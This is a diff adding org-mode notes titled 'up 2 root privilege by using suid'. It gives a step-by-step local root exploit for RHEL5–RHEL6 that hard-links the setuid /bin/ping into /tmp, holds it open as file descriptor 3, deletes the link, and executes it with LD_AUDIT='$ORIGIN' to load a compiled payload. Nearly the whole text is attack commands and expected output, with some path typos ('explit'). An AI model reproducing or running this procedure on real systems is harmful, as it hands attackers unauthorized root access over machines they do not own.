@@ -1,0 +1,54 @@
+#+title: up 2 root privilege by using suid
+
+* zone
+RHEL5 - RHEL6
+
+* steps
+1. create test user mk
+   useradd mk
+   passwd mk
+
+2. swap to mk
+   su - mk
+
+3. whoami
+
+4. check /tmp
+   ls -ld /tmp
+   should be "drwxrwxrwt"
+
+5. check /bin/ping
+   ls -l /bin/ping
+   should be "-rwsr-xr-x"
+
+6. create hard link
+   cd /tmp
+   mkdir exploit
+   ln /bin/ping /tmp/exploit/target
+
+7. run hardlink as fd3
+   exec 3< /tmp/exploit/target
+
+8. check process fd3
+   ls -l /proc/self/fd/3 
+   lr-x------ 1 mk mk 64 Jun  2 23:55 /proc/self/fd/3 -> /tmp/explit/target
+
+9. delete hardlink
+   rm -rf /tmp/explit
+
+10. check hardlink
+	ls -l /proc/self/fd/3 
+	lr-x------ 1 mk mk 64 Jun  2 23:57 /proc/self/fd/3 -> /tmp/explit/target (deleted)
+
+11. check id
+	id 
+
+12. compile payload.c
+	gcc -w -fPIC -shared -o /tmp/exploit payload.c
+
+13. check
+	ls -l /tmp/exploit
+	
+14. up 2 root privilege
+	LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
+
